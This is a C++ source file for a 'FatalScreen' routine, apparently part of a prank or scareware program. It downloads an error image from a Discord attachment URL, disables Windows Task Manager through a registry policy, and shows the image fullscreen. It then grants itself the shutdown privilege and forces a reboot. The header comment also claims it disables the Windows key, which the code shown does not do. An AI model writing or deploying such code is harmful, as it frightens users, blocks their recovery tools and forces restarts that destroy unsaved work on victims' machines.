/*
Born to show a picture, Forced to only restart.
Show a picture and restart system.
While showing a picture, It will disable Superkey
*/
#include "FatalScreen.hpp"
#include <fstream>

void FatalScreen::disableTaskManager() {
    HKEY hKey;
    const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

    if (RegOpenKeyA(HKEY_CURRENT_USER, subKey, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
}

void FatalScreen::enableTaskManager() {
    HKEY hKey;
    const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

    if (RegOpenKeyA(HKEY_CURRENT_USER, subKey, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "DisableTaskMgr");
        RegCloseKey(hKey);
    }
}

bool FatalScreen::showFatalScreen(bool autoRestart, int delaySeconds) {
    try {
        Logger::getInstance()->info("Downloading fatal screen image...");

        // Download Image
        HINTERNET hInternet = InternetOpenA("ImageDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            Logger::getInstance()->expection("Failed to initialize internet connection");
            return false;
        }

        const char* imageUrl = "https://media.discordapp.net/attachments/1237276992479694920/1316041634277752914/Error_Fatal.png?ex=67599ac8&is=67584948&hm=bc261bc3dc169280c53058b546229a3fb74c4f23cfc8347d8bc41fed22400872&=&format=webp&quality=lossless&width=1624&height=1039";
        HINTERNET hFile = InternetOpenUrlA(hInternet, imageUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (!hFile) {
            InternetCloseHandle(hInternet);
            Logger::getInstance()->expection("Failed to open URL");
            return false;
        }

        // Saving File
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        std::string tempFile = std::string(tempPath) + "error.png";

        std::ofstream outFile(tempFile, std::ios::binary);
        char buffer[8192];
        DWORD bytesRead;

        while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            outFile.write(buffer, bytesRead);
        }

        outFile.close();
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);

        Logger::getInstance()->info("Disabling Task Manager...");
        disableTaskManager();

        Logger::getInstance()->info("Showing image...");
        ShellExecuteA(NULL, "open", tempFile.c_str(), NULL, NULL, SW_SHOWMAXIMIZED);

        Sleep(1000); // Wait image

        // Send F11
        INPUT inputs[2] = {};
        inputs[0].type = INPUT_KEYBOARD;
        inputs[0].ki.wVk = VK_F11;
        inputs[1].type = INPUT_KEYBOARD;
        inputs[1].ki.wVk = VK_F11;
        inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(2, inputs, sizeof(INPUT));

        if (autoRestart) {
            Logger::getInstance()->info("Waiting for restart...");
            Sleep(delaySeconds * 1000);

            // Enable Task Manager
            enableTaskManager();

            // Ask for shutdown
            HANDLE hToken;
            TOKEN_PRIVILEGES tkp;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
            }

            // Restart
            Logger::getInstance()->info("Restarting system...");
            ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_INSTALLATION);
        }

        return true;
    }
    catch (const std::exception& e) {
        Logger::getInstance()->expection(std::string("Error in showFatalScreen: ") + e.what());
        enableTaskManager(); // Enable Task Manager when error
        return false;
    }
}